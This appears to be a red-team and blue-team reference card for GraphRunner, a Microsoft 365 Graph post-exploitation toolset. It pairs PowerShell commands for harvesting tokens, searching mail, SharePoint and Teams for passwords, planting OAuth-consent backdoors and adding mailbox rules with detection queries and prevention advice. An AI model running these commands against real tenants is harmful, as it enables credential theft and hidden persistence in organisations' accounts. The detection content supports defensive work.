name: GraphRunner - M365 Graph Post-Exploitation
description: GraphRunner is a post-compromise toolset for Microsoft Graph. With a user token it enumerates the tenant, searches mail/SharePoint/OneDrive/Teams for secrets, abuses app registrations and consent, deploys persistence (malicious app, mailbox rules, OneDrive pillage), and runs an interactive GUI. Built for operating as a compromised user through Graph alone.
notes:
=== LOAD ===
  . .\GraphRunner.ps1

=== GET / REFRESH TOKENS ===
  Get-GraphTokens                 # device-code flow -> $tokens
  Invoke-RefreshGraphTokens       # keep tokens alive

=== RECON ===
  Invoke-GraphRecon -Tokens $tokens        # org, roles, CA policies, app info
  Get-AzureADUsers -Tokens $tokens -OutFile users.txt
  Get-SecurityGroups -Tokens $tokens
  Get-UpdatableGroups -Tokens $tokens       # self-add to groups

=== LOOT (search everything) ===
  Invoke-SearchMailbox   -Tokens $tokens -SearchTerm "password" -MessageCount 50
  Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "passw"
  Invoke-SearchTeams     -Tokens $tokens -SearchTerm "secret"

=== PERSISTENCE / ABUSE ===
  Invoke-InjectOAuthApp  -Tokens $tokens -AppName "Perf" -ReplyUrl ...   # consent-grant backdoor
  Invoke-AddGroupMember  -Tokens $tokens -GroupId <id> -UserId <id>
  New-MailboxRule via Graph (hide/forward)

=== GUI ===
  Invoke-GraphRunnerGUI

=== ALTERNATIVES ===
  TokenTactics    # token minting
  AADInternals    # broader Entra/ADFS attacks
  ROADrecon       # offline enumeration

recommended.note: TokenTactics to mint/refresh the tokens GraphRunner uses.
App/consent abuse overlaps with OAuth app injection.

defense.why_it_works: Microsoft Graph exposes mail, files, Teams, groups, and app management behind one token scope set. A compromised user token lets an attacker read and act across all of M365 using sanctioned API calls that blend with normal client traffic.
defense.prerequisites: A valid Graph access/refresh token for a user (device-code phish or token theft). Some actions need specific delegated scopes or admin/consent rights.
defense.impact: Mass secret discovery across mailboxes/SharePoint/Teams, self-escalation into groups, OAuth-app consent backdoors, and mailbox-rule persistence.
defense.detection: [MITRE T1114/T1098.003] Graph search API bursts across many mailboxes/sites; new OAuth app registrations with consent grants; new inbox rules; group membership self-additions; device-code sign-ins.
defense.artifacts: Entra audit logs (Add app, Consent to application, Add member to group), Exchange audit (New-InboxRule, mailbox searches), MSGraph activity logs, unified audit log SearchQueryInitiatedExchange.
defense.splunk_spl:
index=o365 (Operation="Add service principal." OR Operation="Consent to application." OR Operation="New-InboxRule" OR Operation="Add member to group.")
| stats count by UserId, Operation, ClientIP
defense.elastic_kql: o365.audit.Operation:("Consent to application." or "New-InboxRule" or "Add member to group.")
defense.sentinel_kql:
OfficeActivity
| where Operation in ("Add service principal.","Consent to application.","New-InboxRule","Add member to group.")
| project TimeGenerated, UserId, Operation, ClientIP, Parameters
defense.prevention: Restrict user consent to verified publishers only; admin-consent workflow; disable device-code where unused; alert on new inbox-forwarding rules and app consents; least-privilege Graph scopes; Conditional Access on Graph-using apps.

detections.name: OAuth app consent + persistence burst (GraphRunner)
detections.logic:
OfficeActivity
| where Operation in ("Add service principal.","Consent to application.","New-InboxRule","Add member to group.")
| summarize Ops=make_set(Operation), Count=count() by UserId, ClientIP, bin(TimeGenerated, 1h)
| where Count > 2
detections.false_positives: Admins onboarding apps; mail-rule power users
detections.tuning: Exclude admin accounts in change windows; focus on non-admin UPNs
